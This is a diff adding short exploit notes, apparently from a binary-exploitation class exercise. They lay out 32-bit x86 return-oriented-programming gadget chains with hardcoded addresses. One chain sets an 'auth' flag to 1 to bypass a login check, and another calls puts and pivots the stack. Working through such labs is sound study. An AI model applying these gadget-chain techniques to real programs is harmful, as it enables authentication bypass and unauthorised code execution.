@@ -1,0 +1,33 @@
+notes 2
+
+
+('pop edx', 0xb7c4dc6d) #put auth address in edx
+0x0804A054 #auth address 
+('xor eax,eax', 0xb7c4e79c) #zero eax
+('inc eax', 0xb7c46b41) #eax = 1
+('mov [edx],eax', 0xb7c8df9b) #put 1 in auth
+0x080488c6 #return address
+
+
+
+
+q4
+('pop ebp',0xb7c399a7) #put puts in ebp
+0xb7c81ca0 #address of puts
+0xb7c81ca0 #call puts
+('inc esp', 0xb7c53a18) #skip 4 bytes
+('inc esp', 0xb7c53a18) #skip 4 bytes
+('inc esp', 0xb7c53a18) #skip 4 bytes
+('inc esp', 0xb7c53a18) #skip 4 bytes
+#address of my string
+('pop esp', 0xb7c7b433)
+#actual string
+
+pop ebp, puts_addrs, puts_addrs,esp_+4, str_addrs,pop_esp,loop_addr
+
+0xb7c399a7   <= pop ebp
+0xb7c81ca0   <= address of puts()
+0xb7c81ca0   <= address of puts() , now we jump there
+0xb7c4e79c   <= xor eax, eax       zero eax and increment 4
+
+ 
